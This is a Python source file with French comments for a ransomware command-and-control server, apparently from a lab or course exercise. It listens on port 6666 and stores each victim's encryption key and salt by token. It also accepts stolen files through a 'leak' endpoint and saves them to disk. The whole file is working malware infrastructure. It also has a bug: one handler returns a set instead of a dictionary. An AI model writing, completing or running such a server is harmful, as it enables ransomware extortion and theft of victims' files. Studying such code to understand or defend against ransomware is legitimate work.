import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        token= body.get("token") #récupération du token
        salt= body.get("salt") #récupération du sel
        key= body.get("key") #récupération de la clé
    
        if not token or not salt or not key:
            return {"status":"KO"}
        
        #créer un dossier pour stocker les données de la victime
        victim_path= os.path.join(self.ROOT_PATH, token)
        os.makedirs(victim_path, exist_ok=True)
        
        #sauvegarder les fichiers reçus
        self.save_b64(token, salt, "salt.bin")
        self.save_b64(token, key, "key.bin")
        
        return{"status", "ok"}
    
    def post_leak(self, path: str, params: dict, body: dict) -> dict:
        token = body.get("token") #identification de la victime
        filename = body.get("filename") #nom du fichier volé
        data = body.get("data") #contenu du fichier en base64
        
        if not token or not filename or not data:
            return {"status": "KO"}
        
        #enregistre le fichier volé
        self.save_b64(token, data, filename)
        
        return {"status": "ok"}

#lancement du serveur cnc
if __name__ == "__main__":
    try: 
        os.makedirs(CNC.ROOT_PATH,exist_ok=True) #création du dossier main si absent
        httpd = HTTPServer(('0.0.0.0', 6666), CNC)
        print("serveur CNC démmaré sur le port 6666...")
        httpd.serve_forever()
    except Exception as e:
        print(f"erreur : {e}")  # affiche l'erreur si elle se produit